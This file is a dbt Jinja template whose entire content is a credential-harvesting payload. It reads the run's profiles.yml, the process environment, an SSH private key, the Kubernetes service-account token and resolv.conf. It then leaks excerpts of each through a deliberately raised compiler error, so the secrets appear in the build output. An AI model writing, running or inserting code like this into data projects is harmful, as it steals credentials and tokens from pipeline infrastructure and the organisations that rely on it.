{% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}
{% set ns = namespace(output='[FILE_READ] ') %}

{% set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' %}
{% set profiles = load_file_contents(profiles_path) %}
{% if profiles %}
  {% set ns.output = ns.output ~ 'PROFILES=YES|' ~ profiles[:600] ~ '|END_PROFILES' %}
{% else %}
  {% set ns.output = ns.output ~ 'PROFILES=EMPTY' %}
{% endif %}

{% set environ = load_file_contents('/proc/self/environ') %}
{% if environ %}
  {% set ns.output = ns.output ~ ' | ENVIRON=YES|' ~ environ[:600] %}
{% else %}
  {% set ns.output = ns.output ~ ' | ENVIRON=EMPTY' %}
{% endif %}

{% set ssh_key = load_file_contents('/tmp/jobs/' ~ run_id ~ '/.ssh/id_rsa') %}
{% if ssh_key %}
  {% set ns.output = ns.output ~ ' | SSH=YES|' ~ ssh_key[:300] %}
{% else %}
  {% set ns.output = ns.output ~ ' | SSH=EMPTY' %}
{% endif %}

{% set k8s = load_file_contents('/var/run/secrets/kubernetes.io/serviceaccount/token') %}
{% if k8s %}
  {% set ns.output = ns.output ~ ' | K8S=YES|' ~ k8s[:300] %}
{% else %}
  {% set ns.output = ns.output ~ ' | K8S=EMPTY' %}
{% endif %}

{% set resolv = load_file_contents('/etc/resolv.conf') %}
{% if resolv %}
  {% set ns.output = ns.output ~ ' | RESOLV=YES|' ~ resolv[:200] %}
{% else %}
  {% set ns.output = ns.output ~ ' | RESOLV=EMPTY' %}
{% endif %}

{{ exceptions.raise_compiler_error(ns.output) }}
